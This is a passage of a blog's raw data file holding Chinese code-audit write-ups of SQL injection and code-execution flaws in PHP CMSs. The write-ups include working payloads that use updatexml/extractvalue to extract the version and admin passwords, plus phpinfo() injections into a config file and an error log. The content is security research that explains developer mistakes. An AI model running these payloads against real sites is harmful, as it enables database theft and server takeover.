grq=tes’t</p>\n<p>此时系统会自动在单引号前加反斜线进行转义，$_GET[‘grq’]=”tes\\’t”</p>\n<p>若不使用stripslashes处理，直接赋值给$GLOBALS，则$GLOBALS[‘grq’]= ”tes\\’t”</p>\n<p>若使用sql_replace方法对$GLOBALS进行sql注入过滤，则会变成$GLOBALS[‘grq’]= ”tes\\t”，多出一个反斜线，显然，这造成了极大的隐患。</p>\n<p>那使用sql_replace方法对数据进行过滤是否安全呢？显然，单纯的将特殊字符置空，仍然有安全隐患</p>\n<p>如果传入的值为%2%277，在经过str_replace置空后，变为%27，当程序中存在sql语句拼接执行前先解码(urldecode)的操作时，则会将%27解码为单引号，从而造成sql注入。但是这个cms中，并未存在类似 urldecode(sql_replace（$grq）);这样的操作，因此先不考虑sql_replace方法的绕过。</p>\n<h2 id=\"二、数据库操作类内部定义过滤方法\"><a href=\"#二、数据库操作类内部定义过滤方法\" class=\"headerlink\" title=\"二、数据库操作类内部定义过滤方法\"></a>二、数据库操作类内部定义过滤方法</h2><p>以该cms中封装的insert方法和update方法举例</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143754-5c2705f8-ce15-1.png\"><br>insert方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143808-64177b1c-ce15-1.png\"></p>\n<p>Update方法</p>\n<p>可见，在该cms在使用封装的数据库操作类时，这些类内部的方法，也会对传入的数据新型过滤处理</p>\n<p>以上两类便是该cms框架层面上对sql注入的防护，下面看看在这些防护下，是否还存在sql注入隐患</p>\n<h2 id=\"第一类安全隐患\"><a href=\"#第一类安全隐患\" class=\"headerlink\" title=\"第一类安全隐患\"></a>第一类安全隐患</h2><p>第一类安全隐患，是由于开发者在框架中定义了安全的接收用户输入的方法(input方法)，在开发过程中却忘记使用或记错这个方法的功能所导致的。</p>\n<p>回归漏洞正文，经过我们的分析，这个cms的防护虽然繁琐，且存在绕过的风险，但只要正确使用input方法对入库前的数据进行处理，且处理后不要进行urldecode操作，那就能大概率规避sql注入问题，但是在漏洞挖掘的过程中，发现的问题却令人张目结舌</p>\n<p>漏洞文件： \\api\\sms_check.php 中：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143823-6d5fab0e-ce15-1.png\"></p>\n<p>位于上图13行，可见$code变量的值由$GLOBALS[‘param’]中的值经过strip_tags方法处理后得来</p>\n<p>接着，位于16行处，code变量被拼接到sql语句的where部分，进行执行</p>\n<p>由上文分析下$GLOBALS[‘param’]是从GET\\POST中原封不动的传来</p>\n<p>这样一来，GLOBALS的值我们可以通过GET/POST传递。$GLOBALS[‘param’]的值可控，进而控制$code值,随后，$code变量被拼接到sql语句中执行</p>\n<p>难道不应该使用input方法获取GET/POST传入的参数吗？使用类似如下的代码</p>\n<figure class=\"highlight reasonml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$code = strip<span class=\"constructor\">_tags(<span class=\"params\">input</span>(&#x27;<span class=\"params\">param</span>&#x27;)</span>);</span><br></pre></td></tr></table></figure>\n\n<p>而不是程序中使用的</p>\n<figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$code = strip_tags($GLOBALS[<span class=\"string\">&#x27;param&#x27;</span>])<span class=\"comment\">;</span></span><br></pre></td></tr></table></figure>\n\n<p>显然，开发者在这里忘了之前定义的用来接收用户输入并安全过滤的”input”方法,很明显这是开发时候的失误导致的。</p>\n<p>那是不是由于开发者的疏忽，程序中只有很少几处存在这样的问题呢？</p>\n<p>我们全局搜索一下input方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143842-78e8b7ae-ce15-1.png\"></p>\n<p>在系统中，仅仅有四处使用了input来接收并过滤用户的输入</p>\n<p>跟入其中一处，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143856-8145a11e-ce15-1.png\"></p>\n<p>可见username通过input方法，从GET/POST请求中读取username值</p>\n<p>input方法会调用sql_replace方法进行sql注入过滤，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143908-883203d2-ce15-1.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143921-8fcb2678-ce15-1.png\">但是，位于上图第二个红框处，又使用了一次sql_replace对输入进行过滤。在这里我猜测，可能开发者忘记了input的功能了</p>\n<p>构造如下payload：</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">http</span>://<span class=\"number\">127.0.0.1</span>/www/api/sms_check.php?param=<span class=\"number\">1</span>%<span class=\"number\">27</span>%<span class=\"number\">20</span>and%<span class=\"number\">20</span>updatexml(<span class=\"number\">1</span>,concat(<span class=\"number\">0</span>x<span class=\"number\">7</span>e,(SELECT%<span class=\"number\">20</span>@@version),<span class=\"number\">0</span>x<span class=\"number\">7</span>e),<span class=\"number\">1</span>)--%<span class=\"number\">20</span></span><br></pre></td></tr></table></figure>\n\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903145216-5dee9598-ce17-1.png\"></p>\n<p>Sql注入成功</p>\n<p>同理，这种类型的漏洞在此cms中大量出现</p>\n<h2 id=\"第二类安全隐患\"><a href=\"#第二类安全隐患\" class=\"headerlink\" title=\"第二类安全隐患\"></a>第二类安全隐患</h2><p>第二类安全隐患，是由于封装的数据库操作类内部的方法，只对传入数组的键值进行过滤，而忽略了键名仍有传入payload的风险</p>\n<p>漏洞文件： \\coreframe\\app\\content\\admin\\category.php 中的add方法：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143959-a644fe06-ce15-1.png\"></p>\n<p>由于$formdata = $GLOBALS[‘form’]，因此$formdata可由GET/POST传入，可控。上图87行处， $formdata被传入db-&gt;insert方法进行sql语句执行</p>\n<p>跟进db-&gt;insert方法：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903144014-af91e97e-ce15-1.png\"></p>\n<p>上图位于109行至116行，此处代码段对传入$data的值（$values）部分通过escape_string进行过滤，但是并未对$data数组的键（$field）部分进行过滤,因此可以将payload传入key部分，绕过escape_string过滤，造成sql注入</p>\n<p>回到注入点，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903144036-bc6a91dc-ce15-1.png\"></p>\n<p>问题出在上图73行处，直接将GET\\POST传入的值赋值给$formdata,导致可以从请求中传入数组，进而控制$formdata数组的键名</p>\n<p>Payload为</p>\n<figure class=\"highlight angelscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;form[seo_description`)values(updatexml(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,version(),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>))%<span class=\"number\">23</span>]=<span class=\"number\">666</span></span><br></pre></td></tr></table></figure>\n\n<p>最终注入结果如下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903145153-506006b4-ce17-1.png\"></p>\n<p>注入成功</p>\n<p>同理，这种类型的漏洞在此cms中大量出现</p>\n<h2 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h2><p>从本次代码审计的结果来看，程序虽然在框架入口以及封装的数据库操作类中进行了过滤，但由于对过滤方法的错误使用以及过滤点不全面，导致了大量的注入产生。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/SDP下一代的企业访问控制方法.jpg","excerpt":"<p>为了大致了解此cms，首先来看看这个cms为了防止sql注入，都做了哪些防护</p>","more":"<h2 id=\"一、程序入口处定义了过滤方法\"><a href=\"#一、程序入口处定义了过滤方法\" class=\"headerlink\" title=\"一、程序入口处定义了过滤方法\"></a>一、程序入口处定义了过滤方法</h2><p>首先，程序通过set_globals方法，将get与post传入的参数，赋值到$GLOBALS数组中：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143634-2c709cc0-ce15-1.png\"></p>\n<p>在赋值过程中，使用gpc_stripslashes来处理传入的键值</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143649-351daaf2-ce15-1.png\"></p>\n<p>gpc_stripslashes方法的作用是，当MAGIC_QUOTES_GPC开启时，去除MAGIC_QUOTES_GPC所添加的转义符</p>\n<p>这里的操作很奇特，在一般的cms中，在进行这样为伪全局变量赋值时，往往会判断MAGIC_QUOTES_GPC是否开启，当MAGIC_QUOTES_GPC为off时，程序会履行MAGIC_QUOTES_GPC的功能，为伪全局变量进行转义过滤。</p>\n<p>如下图，另一款cms中的操作：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143700-3c11e59e-ce15-1.png\"></p>\n<p>但是在本文中分析的cms中，正好反向操作，如果MAGIC_QUOTES_GPC开启，则去除其转义效果，这个cms为什么要这样做呢？接着往下看。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143712-4332d9fa-ce15-1.png\"></p>\n<p>可见该cms存在input方法，该方法对$GLOBALS数组中的值通过sql_replace方法进行sql过滤</p>\n<p>分析一下sql_replace方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143725-4a91ca4e-ce15-1.png\"></p>\n<p>可见是使用str_replace方法，对传入参数中的特殊字符进行置空处理，防止sql注入攻击</p>\n<p>此外，还存在一处safe_htm方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143739-534b155a-ce15-1.png\"></p>\n<p>对输入中的html特殊字符进行转义，方式xss攻击</p>\n<p>开发者的意图，在这里猜测一下，应该是：</p>\n<p>将GET\\POST的传入键值对，原封不动的传递给$GLOBALS数组，若数据需要入库，使用sql_replace方法对数据进行过滤；若数据需要前端页面展示，使用safe_htm方法进行转义</p>\n<p>通过我对开发者意图的猜测可知，之所以在将GET\\POST的传入键值对传递给$GLOBALS期间使用stripslashes去掉MAGIC_QUOTES_GPC可能添加的反斜杠，是为了防止后续sql_replace等操作时出问题</p>\n<p>例如在MAGIC_QUOTES_GPC开启时，GET中传入 grq=tes’t</p>\n<p>此时系统会自动在单引号前加反斜线进行转义，$_GET[‘grq’]=”tes\\’t”</p>\n<p>若不使用stripslashes处理，直接赋值给$GLOBALS，则$GLOBALS[‘grq’]= ”tes\\’t”</p>\n<p>若使用sql_replace方法对$GLOBALS进行sql注入过滤，则会变成$GLOBALS[‘grq’]= ”tes\\t”，多出一个反斜线，显然，这造成了极大的隐患。</p>\n<p>那使用sql_replace方法对数据进行过滤是否安全呢？显然，单纯的将特殊字符置空，仍然有安全隐患</p>\n<p>如果传入的值为%2%277，在经过str_replace置空后，变为%27，当程序中存在sql语句拼接执行前先解码(urldecode)的操作时，则会将%27解码为单引号，从而造成sql注入。但是这个cms中，并未存在类似 urldecode(sql_replace（$grq）);这样的操作，因此先不考虑sql_replace方法的绕过。</p>\n<h2 id=\"二、数据库操作类内部定义过滤方法\"><a href=\"#二、数据库操作类内部定义过滤方法\" class=\"headerlink\" title=\"二、数据库操作类内部定义过滤方法\"></a>二、数据库操作类内部定义过滤方法</h2><p>以该cms中封装的insert方法和update方法举例</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143754-5c2705f8-ce15-1.png\"><br>insert方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143808-64177b1c-ce15-1.png\"></p>\n<p>Update方法</p>\n<p>可见，在该cms在使用封装的数据库操作类时，这些类内部的方法，也会对传入的数据新型过滤处理</p>\n<p>以上两类便是该cms框架层面上对sql注入的防护，下面看看在这些防护下，是否还存在sql注入隐患</p>\n<h2 id=\"第一类安全隐患\"><a href=\"#第一类安全隐患\" class=\"headerlink\" title=\"第一类安全隐患\"></a>第一类安全隐患</h2><p>第一类安全隐患，是由于开发者在框架中定义了安全的接收用户输入的方法(input方法)，在开发过程中却忘记使用或记错这个方法的功能所导致的。</p>\n<p>回归漏洞正文，经过我们的分析，这个cms的防护虽然繁琐，且存在绕过的风险，但只要正确使用input方法对入库前的数据进行处理，且处理后不要进行urldecode操作，那就能大概率规避sql注入问题，但是在漏洞挖掘的过程中，发现的问题却令人张目结舌</p>\n<p>漏洞文件： \\api\\sms_check.php 中：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143823-6d5fab0e-ce15-1.png\"></p>\n<p>位于上图13行，可见$code变量的值由$GLOBALS[‘param’]中的值经过strip_tags方法处理后得来</p>\n<p>接着，位于16行处，code变量被拼接到sql语句的where部分，进行执行</p>\n<p>由上文分析下$GLOBALS[‘param’]是从GET\\POST中原封不动的传来</p>\n<p>这样一来，GLOBALS的值我们可以通过GET/POST传递。$GLOBALS[‘param’]的值可控，进而控制$code值,随后，$code变量被拼接到sql语句中执行</p>\n<p>难道不应该使用input方法获取GET/POST传入的参数吗？使用类似如下的代码</p>\n<figure class=\"highlight reasonml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$code = strip<span class=\"constructor\">_tags(<span class=\"params\">input</span>(&#x27;<span class=\"params\">param</span>&#x27;)</span>);</span><br></pre></td></tr></table></figure>\n\n<p>而不是程序中使用的</p>\n<figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$code = strip_tags($GLOBALS[<span class=\"string\">&#x27;param&#x27;</span>])<span class=\"comment\">;</span></span><br></pre></td></tr></table></figure>\n\n<p>显然，开发者在这里忘了之前定义的用来接收用户输入并安全过滤的”input”方法,很明显这是开发时候的失误导致的。</p>\n<p>那是不是由于开发者的疏忽，程序中只有很少几处存在这样的问题呢？</p>\n<p>我们全局搜索一下input方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143842-78e8b7ae-ce15-1.png\"></p>\n<p>在系统中，仅仅有四处使用了input来接收并过滤用户的输入</p>\n<p>跟入其中一处，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143856-8145a11e-ce15-1.png\"></p>\n<p>可见username通过input方法，从GET/POST请求中读取username值</p>\n<p>input方法会调用sql_replace方法进行sql注入过滤，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143908-883203d2-ce15-1.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143921-8fcb2678-ce15-1.png\">但是，位于上图第二个红框处，又使用了一次sql_replace对输入进行过滤。在这里我猜测，可能开发者忘记了input的功能了</p>\n<p>构造如下payload：</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">http</span>://<span class=\"number\">127.0.0.1</span>/www/api/sms_check.php?param=<span class=\"number\">1</span>%<span class=\"number\">27</span>%<span class=\"number\">20</span>and%<span class=\"number\">20</span>updatexml(<span class=\"number\">1</span>,concat(<span class=\"number\">0</span>x<span class=\"number\">7</span>e,(SELECT%<span class=\"number\">20</span>@@version),<span class=\"number\">0</span>x<span class=\"number\">7</span>e),<span class=\"number\">1</span>)--%<span class=\"number\">20</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903145216-5dee9598-ce17-1.png\"></p>\n<p>Sql注入成功</p>\n<p>同理，这种类型的漏洞在此cms中大量出现</p>\n<h2 id=\"第二类安全隐患\"><a href=\"#第二类安全隐患\" class=\"headerlink\" title=\"第二类安全隐患\"></a>第二类安全隐患</h2><p>第二类安全隐患，是由于封装的数据库操作类内部的方法，只对传入数组的键值进行过滤，而忽略了键名仍有传入payload的风险</p>\n<p>漏洞文件： \\coreframe\\app\\content\\admin\\category.php 中的add方法：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903143959-a644fe06-ce15-1.png\"></p>\n<p>由于$formdata = $GLOBALS[‘form’]，因此$formdata可由GET/POST传入，可控。上图87行处， $formdata被传入db-&gt;insert方法进行sql语句执行</p>\n<p>跟进db-&gt;insert方法：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903144014-af91e97e-ce15-1.png\"></p>\n<p>上图位于109行至116行，此处代码段对传入$data的值（$values）部分通过escape_string进行过滤，但是并未对$data数组的键（$field）部分进行过滤,因此可以将payload传入key部分，绕过escape_string过滤，造成sql注入</p>\n<p>回到注入点，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903144036-bc6a91dc-ce15-1.png\"></p>\n<p>问题出在上图73行处，直接将GET\\POST传入的值赋值给$formdata,导致可以从请求中传入数组，进而控制$formdata数组的键名</p>\n<p>Payload为</p>\n<figure class=\"highlight angelscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;form[seo_description`)values(updatexml(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,version(),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>))%<span class=\"number\">23</span>]=<span class=\"number\">666</span></span><br></pre></td></tr></table></figure>\n\n<p>最终注入结果如下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190903145153-506006b4-ce17-1.png\"></p>\n<p>注入成功</p>\n<p>同理，这种类型的漏洞在此cms中大量出现</p>\n<h2 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h2><p>从本次代码审计的结果来看，程序虽然在框架入口以及封装的数据库操作类中进行了过滤，但由于对过滤方法的错误使用以及过滤点不全面，导致了大量的注入产生。</p>"},{"title":"从某cmsV9.9四个漏洞看程序开发安全","date":"2019-08-12T06:21:35.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n近日，对某cmsV9.9版本进行代码审计，发现了4处漏洞。\n\n这4处漏洞漏洞比较基础，也很经典。从这4处漏洞，可以反应了在程序开发过程中一些容易忽略的问题，下面分享下本次审计过程。\n\n<!--more-->\n\n \n\n## 审计之旅\n\n在开发程序时，如果没有正确的过滤单引号（'）、双引号（\"）、反斜杠（\\）等特殊字符，往往会产生代码/sql注入漏洞。\n\n在针对这些特殊字符，开发者经常使用如下方式进行过滤：\n\n1. 使用addslashes进行过滤\n2. 使用str_replace对单引号等进行替换操作\n3. 使用is_numeric等方法对数字类型的输入进行判断与过滤\n\n \n\n审计此cms时发现，以上3种方式，在此程序的开发过程中，都有使用。但是，不严谨的使用，使得注入漏洞仍然存在\n\n首先分析下此cms，来看下\\include\\common.php文件\n![1.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170321-dfc7e1ba-b75f-1.png)\n\n如上图，在common.php文件中require filter.inc.php\n\n在filter.inc.php文件中，存在如下图代码\n![2.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170346-ee9f281a-b75f-1.png)\n此cms使用伪全局变量的模式，使用foreach从’_GET','_POST','_COOKIE’中遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值过滤后作为变量的值\n![3.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170415-001c2840-b760-1.png)\n跟进_FilterAll\n![4.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170426-06ac2c1e-b760-1.png)\n可见，程序在此处使用addslashes对键值进行过滤\n\n这样一来，我们可以通过’_GET','_POST','_COOKIE’为程序中的任意参数传入值，但是传入的值会被addslashes过滤\n\n例如 [http://www.testcms.com/index.php?grq=1'23](http://www.testcms.com/index.php?grq=1'23)\n\n程序接收此url后，程序中的grq变量会为：$grq=\"1\\'23\" \n\n开发者对这样的处理方式仍然不放心，于是，在\\include\\common.php文件中require_once(sea_INC.\"/filter.inc.php\")进行过滤后，再次从’_GET','_POST','_COOKIE’中取键值对进行伪全局变量赋值与过滤\n![5.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170441-0f62d70e-b760-1.png)\n跟进_RunMagicQuotes方法\n![6.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170525-29b4d468-b760-1.png)\n_RunMagicQuotes方法中对键值使用addslashes进行过滤与赋值变量\n\n以上两段代码依次执行，对比下这两处代码\n![7.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170534-2eca8812-b760-1.png)filter.inc.php文件中的过滤与赋值代码\n\n![8.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170542-33c69ac2-b760-1.png)common.php文件中的过滤与赋值代码\n\nfilter.inc.php文件中赋值的${$k}被后续common.php文件中的${$k}覆盖了，filter.inc.php文件中的过滤部分代码**白写了**。\n\n虽说filter.inc.php过滤部分代码在做无用功，但是仍然可以看出开发者对特殊字符的防范意识很高\n\n在了解完该程序之后，接下来漏洞：\n\n### 1．未对拼接参数使用单引号闭合而导致的sql注入漏洞\n![9.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170625-4d79ba62-b760-1.png)\n位于上图143行处\n\n经过上文对程序伪全局变量赋值方式的分析可知，这里$leftSelect 可由GET方法传递的来。当使用GET传入$leftSelect时，程序会使用addslashes对参数进行过滤\n\n但是如上图143行拼接的sql语句来看，并未对$leftSelect变量使用单引号进行闭合，导致虽然使用addslashes函数进行过滤，但仍然存在sql注入漏洞\n构造payload\n&leftSelect=1 or updatexml(1,concat(0x7,user(),0x7e),1)\n\n最终执行的sql语句是：\n\nUPDATE `sea_data` SET `tid`= 1 where tid= 1 or updatexml(1,concat(0x7,user(),0x7e),1)\n\n \n\n同样，在另一处文件中admin_tempvideo.php， 也存在相同的漏洞\n![10.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170635-53229dee-b760-1.png)\n![11.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170643-57fc4932-b760-1.png)\n如上图可见，$ids变量被拼接到sql语句中，并在上图25行被执行\n\n$ids变量由$e_id通过implode方法拼接而来，而$e_id变量可以通过GET方法直接传入，$e_id变量可控，由此造成sql注入漏洞\n\n构造的payload如下\n\n[&e_id[0\\]=1)%20or%20extractvalue(1,concat(0x7e,(SELECT%20CONCAT_WS(0x23,name,%20password)%20FROM%20sea_admin%20limit%200,1)))--%20&type=1](http://127.0.0.1/seacms/sh8vu7/admin_tempvideo.php?action=import&e_id[0]=1) or extractvalue(1,concat(0x7e,(SELECT CONCAT_WS(0x23,name, password) FROM sea_admin limit 0,1)))-- &type=1)\n\n \n\n### 2．对键值进行过滤，忘记对键名进行处理\n\n漏洞文件： admin_config.php\n![12.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170707-664ae516-b760-1.png)\n如上图，看到将$configstr变量写入文件中去\n\n查看下写入文件的具体位置\n![13.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170714-6ad85550-b760-1.png)\n该位置固定，即为[/data/config.cache.inc.php](http://127.0.0.1/seacms/data/config.cache.inc.php)\n![14.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170722-6f5544ee-b760-1.png)\nconfig.cache.inc.php\n\n \n\n跟踪下$configstr变量\n![15.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170732-759332f8-b760-1.png)\n$configstr变量由$k与$v拼接而来，\n\n在下图红框中所示，$$k的值经过str_replace方法过滤\n![16.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170740-79f1ceea-b760-1.png)\n在程序入口处，通过伪全局变量的方式，其实已经对$_POST中的$k进行变量赋值，所以$$k的值即为通过POST传入的变量的经过过滤的键值\n\n例如POST中\n\n&edit___grq=te’st\n\n那么，此时的$k=“&edit___grq”，$&edit___grq=”te\\’st”,$$k=” te\\’st”\n\n \n\n值得注意的是，上图中仅仅对$$k 进行str_replace处理，而$k并没有经过任何过滤，直接拼接到$configstr变量中，也就是说，可以通过POST提交的KEY值传递构造好的payload，该payload将会被写入文件中去，造成远程代码执行\n\n回头看一下config.cache.inc.php文件\n![17.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170748-7efd7696-b760-1.png)\n开发者在写过滤代码时，考虑到程序在处理配置文件经常会出现漏洞:即配置文件中变量值注入的问题\n\n在以往的此类漏洞中，往往是未对配置文件中变量值进行合理的过滤，导致单引号等特殊字符被写入值部分，从而构造闭合结果导致注入的产生。\n\n所以，开发者吸取了以往的经验，对写入配置文件中的值部分进行str_replace处理，对”’”与”\\”进行转义。但是，由于这里的变量名同样可控，而且未对变量名进行任何过滤，因此，str_replace处理形同虚设\n\n \n\n使用如下payload，直接注入\n\n&edit___a;phpinfo();//=1\n![18.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170757-840d8928-b760-1.png)\n### 3．经过严格的过滤，报错日志文件中却存在利用点 \n\n漏洞触发点位于\\comment\\api\\index.php\n![19.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170805-894f01be-b760-1.png)\n由于seacms采用伪全局变量的形式，$page $id等变量可以从GET请求参数中传递进来\n\n程序使用is_numeric对$page进行限制，使得$page必须是数字\n\n上图最下面一行，$h = ReadData($id,$page);\n\n可见将GET请求传入的$id,$page 传递进ReadDate方法中\n\n跟入ReadDate方法\n![20.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170817-90605778-b760-1.png)\n可见GET请求传入的$id,$page 传递进Readmlist方法中\n\n跟进Readmlist方法\n![21.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170825-94daf88a-b760-1.png)\n在Readmlist方法中的88行，可见存在一处sql语句\n![22.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170832-9933cb32-b760-1.png)\n可以看到，该sql语句中拼接了$page变量，而$page变量是由GET请求接收而来，可控\n\n当我们通过GET请求传递一个负数值的page时(例如-1)，此时执行的sql语句为\nSELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=1 AND v_id=666 ORDER BY id DESC limit -20,10\n\n该sql语句会导致sql语法错误而报错，如下图\n![23.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170841-9e3bb7ac-b760-1.png)\n到此为止，程序仍然是安全的，并不存在sql注入或是代码执行漏洞。但是此cms对报错日志的处理方式，却很有意思：\n\n \n\n当sql语法出现错误时，程序会将报错日志会被写入\\data\\mysqli_error_trace.php\n![24.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170851-a44a23d6-b760-1.png)\n跟进mysqli_error_trace.php文件，错误日志的格式如上图：\n\n错误日志会被<?php ?>包裹\n\n第一行（第一个红框）为触发错误的url\n\n第二行（第二个红框）为sql语法错误信息\n\n \n\n因此，当构造payload如下时\n\ncomment/api/index.php?page=-1&gid=666&payload=*/phpinfo();/*\n\n \n\n执行成功后，可见成功写入mysqli_error_trace.php，如下图：\n![25.png](https://xzfile.aliyuncs.com/media/upload/picture/20190805170900-a999b338-b760-1.png)\n访问[/data/mysqli_error_trace.php](http://127.0.0.1/seacms/data/mysqli_error_trace.php)\n\n即可执行phpinfo\n\n \n\n## 结束语\n\n从本次代码审计的结果来看，程序在使用addslashes等过滤方式对输入进行过滤后，仍然产生了两处代码执行，两处sql注入。因此使用addslashes等过滤方式在程序入口处对输入进行过滤并不能代表程序固若金汤。配合程序自身的逻辑，使用恰当的方式进行参数过滤才是最优解。","source":"_posts/cmsV9-9.md","raw":"---\ntitle: 从某cmsV9.9四个漏洞看程序开发安全\ndate: 2019-08-12 14:21:35\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n近日，对某cmsV9.9版本进行代码审计，发现了4处漏洞。\n\n这4处漏洞漏洞比较基础，也很经典。从这4处漏洞，可以反应了在程序开发过程中一些容易忽略的问题，下面分享下本次审计过程。\n\n<!--more-->\n\n \n\n## 审计之旅\n\n在开发程序时，如果没有正确的过滤单引号（'）、双引号（\"）、反斜杠（\\）等特殊字符，往往会产生代码/sql注入漏洞。\n\n在针对这些特殊字符，开发者经常使用如下方式进行过滤：\n\n1. 